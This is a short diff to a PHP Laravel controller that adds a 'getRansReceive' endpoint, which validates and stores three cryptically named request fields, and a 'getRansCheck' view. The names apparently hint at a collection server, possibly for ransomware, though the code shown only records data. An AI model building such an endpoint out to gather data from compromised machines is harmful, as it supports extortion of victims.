@@ -65,4 +65,46 @@ class MainController extends Controller {
            return $ret;                                                                                            
 	}
 
+	/**
+	 * Show the application welcome screen to the user.
+	 *
+	 * @return Response
+	 */
+	public function getRansReceive(Request $request)
+    {
+           $req = $request->all();
+		   #dd($req);
+           $ret = "";
+               
+                $validator = Validator::make($req, [
+                             'fn' => 'required',
+                             'og' => 'required',
+                             'gg' => 'required',
+                   ]);
+         
+                 if($validator->fails())
+                  {
+                       $ret = "wjhwjwhjef owkjhjknj!";
+                       
+                 }
+                
+                 else
+                 { 
+                       $this->helpers->addRecord($req);  
+                        $ret = "OK";                      
+                  }       
+           return $ret;                                                                                            
+    }
+
+	/**
+	 * Show the application welcome screen to the user.
+	 *
+	 * @return Response
+	 */
+	public function getRansCheck()
+    {
+        $ret = null;
+    	return view('index', compact(['ret']));
+    }
+	
 }
